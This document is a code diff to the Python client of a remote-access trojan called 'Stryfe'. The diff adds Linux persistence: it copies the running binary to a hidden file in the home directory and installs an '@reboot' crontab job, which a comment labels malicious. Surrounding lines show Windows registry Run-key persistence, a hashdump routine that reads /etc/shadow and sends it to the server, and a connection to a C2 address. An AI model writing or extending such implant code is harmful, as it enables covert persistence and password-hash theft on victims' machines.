@@ -27,7 +27,7 @@ class Client:
             'search': self.search,
             'ipconfig': self.ipconfig
         }
-        self.exe_path = None
+        self.agent_path = None
     
     def connect(self):
         context = ssl.create_default_context()
@@ -176,14 +176,14 @@ class WindowsClient(Client):
         os.remove(screen_path)
 
     def persistence(self):
-        self.exe_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
+        self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
 
         # Check if Persistence is already in place
-        if os.path.exists(self.exe_path):
+        if os.path.exists(self.agent_path):
             return 0
 
         try:
-            shutil.copy2(sys.argv[0], self.exe_path)
+            shutil.copy2(sys.argv[0], self.agent_path)
 
         except Exception as e:
             return 1
@@ -192,7 +192,7 @@ class WindowsClient(Client):
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.exe_path)
+        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
         winreg.CloseKey(key)
 
     def hashdump(self, args):
@@ -221,7 +221,29 @@ class LinuxClient(Client):
         os.remove(screen_path)
 
     def persistence(self):
-        pass
+
+        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")
+
+        try:
+            shutil.copy2(sys.argv[0], self.agent_path)
+
+        except Exception as e:
+            return 1
+
+        # Read whole current crontab
+        try:
+            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
+        except:
+            return 0
+        # Malicious cron for persistence
+        job = f"@reboot bash -c {self.agent_path}\n"
+        
+        # Check if cron already exist
+        if job not in crontab:
+            crontab = crontab + job
+            process = subprocess.run(['crontab', '-'], input=crontab, text=True)
+
+        # TODO Self removing the executable
 
     def hashdump(self, args):
         if os.access('/etc/shadow', os.R_OK):
@@ -243,21 +265,15 @@ class LinuxClient(Client):
             output = e.output
         finally:
             self.secure_sock.sendall(output.encode())
-    
-    def _answerProbes(self):
-        print('ANSWERING')
-        while True:
-            data = self.secure_sock.recv(1024)
-            if data == b'\x10\x10\x10':
-                print('.')
-                self.secure_sock.sendall(b'\x20\x20\x20')
 
 if __name__ == "__main__":
+    C2_IP = '127.0.0.1'
+    C2_PORT = 8888
     if platform.system() == 'Windows':
-        client = WindowsClient('127.0.0.1', 8888)
+        client = WindowsClient(C2_IP, C2_PORT)
         # client.persistence()
     else:
-        client = LinuxClient('127.0.0.1', 8888)
-        threading.Thread(target=client._answerProbes)
+        client = LinuxClient(C2_IP, C2_PORT)
+        client.persistence()
 
     client.connect()
